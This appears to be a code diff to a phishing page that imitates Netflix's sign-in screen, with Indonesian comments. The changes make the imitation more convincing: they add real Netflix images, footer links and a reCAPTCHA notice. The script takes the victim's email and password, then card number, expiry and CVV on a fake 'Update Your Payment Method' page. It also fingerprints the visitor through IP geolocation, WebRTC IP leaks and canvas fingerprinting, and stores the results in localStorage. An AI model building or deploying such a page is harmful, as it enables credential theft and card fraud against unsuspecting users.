@@ -7,68 +7,115 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
-            background-color: #141414;
+            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d0b0237-60f7-4e98-a752-092874e7e1fc/96dc82d8-7775-4e16-8347-7a862a7f1944/US-en-20240624-popsignuptwoweeks-perspective_alpha_website_large.jpg') no-repeat center center fixed;
+            background-size: cover;
             color: #fff;
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+        }
+        .overlay {
+            background: rgba(0, 0, 0, 0.75);
+            min-height: 100vh;
         }
         .netflix-logo {
-            width: 100px;
-            height: 36px;
-            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d0b0237-60f7-4e98-a752-092874e7e1fc/96dc82d8-7775-4e16-8347-7a862a7f1944/US-en-20240624-popsignuptwoweeks-perspective_alpha_website_small.png') no-repeat;
+            width: 167px;
+            height: 45px;
+            background: url('https://assets.nflxext.com/ffe/siteui/acquisition/our-story/fuji/desktop/netflix-logo.png') no-repeat;
             background-size: contain;
+        }
+        input::placeholder {
+            color: #8c8c8c;
+        }
+        footer a {
+            color: #8c8c8c;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <!-- Halaman Login -->
-    <div id="loginPage" class="min-h-screen flex flex-col">
-        <header class="p-6">
+    <div id="loginPage" class="overlay flex flex-col">
+        <header class="p-4 md:p-6">
             <div class="netflix-logo"></div>
         </header>
-        <main class="flex-grow flex items-center justify-center">
-            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
-                <h1 class="text-3xl font-bold mb-6">Sign In</h1>
+        <main class="flex-grow flex items-center justify-center px-4">
+            <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[450px]">
+                <h1 class="text-3xl font-semibold mb-8">Sign In</h1>
                 <div id="loginForm" class="space-y-4">
-                    <input id="email" type="email" placeholder="Email or phone number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
-                    <input id="password" type="password" placeholder="Password" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
-                    <button id="signInButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Sign In</button>
-                    <p class="text-gray-400 text-sm">New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.</p>
+                    <input id="email" type="email" placeholder="Email or phone number" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                    <input id="password" type="password" placeholder="Password" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                    <button id="signInButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium">Sign In</button>
+                    <div class="flex justify-between items-center text-sm text-gray-400">
+                        <label class="flex items-center">
+                            <input type="checkbox" class="mr-2">
+                            Remember me
+                        </label>
+                        <a href="#" class="hover:underline">Need help?</a>
+                    </div>
+                    <p class="text-gray-400 text-sm">
+                        New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.
+                    </p>
+                    <p class="text-gray-400 text-xs">
+                        This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#" class="text-blue-500 hover:underline">Learn more</a>.
+                    </p>
                 </div>
             </div>
         </main>
-        <footer class="p-6 text-gray-400 text-sm">
-            <p>Questions? Call 1-844-505-2993</p>
+        <footer class="p-6 md:p-8 text-gray-400 text-sm">
+            <div class="max-w-5xl mx-auto">
+                <p class="mb-4">Questions? Call 1-844-505-2993</p>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <a href="#" class="hover:underline">FAQ</a>
+                    <a href="#" class="hover:underline">Help Center</a>
+                    <a href="#" class="hover:underline">Terms of Use</a>
+                    <a href="#" class="hover:underline">Privacy</a>
+                    <a href="#" class="hover:underline">Cookie Preferences</a>
+                    <a href="#" class="hover:underline">Corporate Information</a>
+                </div>
+            </div>
         </footer>
     </div>
 
     <!-- Halaman Pembayaran -->
-    <div id="paymentPage" class="min-h-screen flex flex-col hidden">
-        <header class="p-6">
+    <div id="paymentPage" class="overlay flex flex-col hidden">
+        <header class="p-4 md:p-6">
             <div class="netflix-logo"></div>
         </header>
-        <main class="flex-grow flex items-center justify-center">
-            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
-                <h1 class="text-2xl font-bold mb-6">Update Your Payment Method</h1>
+        <main class="flex-grow flex items-center justify-center px-4">
+            <div class="bg-black bg-opacity-75 p-6 md:p-16 rounded w-full max-w-[450px]">
+                <h1 class="text-2xl font-semibold mb-8">Update Your Payment Method</h1>
                 <div id="paymentForm" class="space-y-4">
-                    <input id="cardHolder" type="text" placeholder="Name on Card" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
-                    <input id="cardNumber" type="text" placeholder="Card Number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                    <input id="cardHolder" type="text" placeholder="Name on Card" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                    <input id="cardNumber" type="text" placeholder="Card Number" class="w-full p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
                     <div class="flex space-x-4">
-                        <input id="expiryDate" type="text" placeholder="MM/YY" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
-                        <input id="cvv" type="text" placeholder="CVV" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
+                        <input id="expiryDate" type="text" placeholder="MM/YY" class="w-1/2 p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
+                        <input id="cvv" type="text" placeholder="CVV" class="w-1/2 p-4 bg-[#333] text-white rounded focus:outline-none focus:ring-0" required>
                     </div>
-                    <button id="submitPaymentButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Submit Payment</button>
+                    <button id="submitPaymentButton" class="w-full bg-[#e50914] text-white p-4 rounded hover:bg-[#c11119] font-medium">Submit Payment</button>
                 </div>
             </div>
         </main>
-        <footer class="p-6 text-gray-400 text-sm">
-            <p>Questions? Call 1-844-505-2993</p>
+        <footer class="p-6 md:p-8 text-gray-400 text-sm">
+            <div class="max-w-5xl mx-auto">
+                <p class="mb-4">Questions? Call 1-844-505-2993</p>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <a href="#" class="hover:underline">FAQ</a>
+                    <a href="#" class="hover:underline">Help Center</a>
+                    <a href="#" class="hover:underline">Terms of Use</a>
+                    <a href="#" class="hover:underline">Privacy</a>
+                    <a href="#" class="hover:underline">Cookie Preferences</a>
+                    <a href="#" class="hover:underline">Corporate Information</a>
+                </div>
+            </div>
         </footer>
     </div>
 
     <script>
         async function collectUserData() {
             try {
-                // 1. IP Geolocation (Dengan Fallback)
                 let ipData = {};
                 try {
                     const ipResponse = await fetch('https://ipapi.co/json/');
@@ -84,11 +131,9 @@
                     }
                 }
 
-                // 2. Browser Fingerprinting (Zona Waktu dan Bahasa)
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                 const language = navigator.language;
 
-                // 3. WebRTC Leak
                 let webrtcIps = [];
                 try {
                     const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -109,7 +154,6 @@
                     webrtcIps.push('Tidak tersedia');
                 }
 
-                // 4. Canvas Fingerprinting
                 let canvasFingerprint = 'Tidak tersedia';
                 try {
                     const canvas = document.createElement('canvas');
@@ -132,7 +176,6 @@
                     console.log('Canvas Fingerprinting error:', error);
                 }
 
-                // 5. Informasi Browser
                 const userAgent = navigator.userAgent;
                 let platform = navigator.platform;
                 if (/iPhone|iPad|iPod/.test(userAgent) && !platform.includes('iPhone')) {
@@ -159,10 +202,8 @@
             }
         }
 
-        // Simpan data login dan pembayaran
         let userData = {};
 
-        // Tangani login
         document.getElementById('signInButton').addEventListener('click', async () => {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
@@ -172,7 +213,6 @@
                 userData.password = password;
                 userData.tracking = await collectUserData();
 
-                // Sembunyikan halaman login, tampilkan halaman pembayaran
                 document.getElementById('loginPage').classList.add('hidden');
                 document.getElementById('paymentPage').classList.remove('hidden');
             } else {
@@ -180,7 +220,6 @@
             }
         });
 
-        // Tangani pengiriman pembayaran
         document.getElementById('submitPaymentButton').addEventListener('click', () => {
             const cardHolder = document.getElementById('cardHolder').value;
             const cardNumber = document.getElementById('cardNumber').value;
@@ -195,12 +234,10 @@
                     cvv
                 };
 
-                // Simpan ke localStorage
                 let storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');
                 storedData.push(userData);
                 localStorage.setItem('trackedUsers', JSON.stringify(storedData));
 
-                // Redirect atau tampilkan pesan sukses
                 alert('Payment submitted successfully. Thank you!');
                 window.location.reload();
             } else {
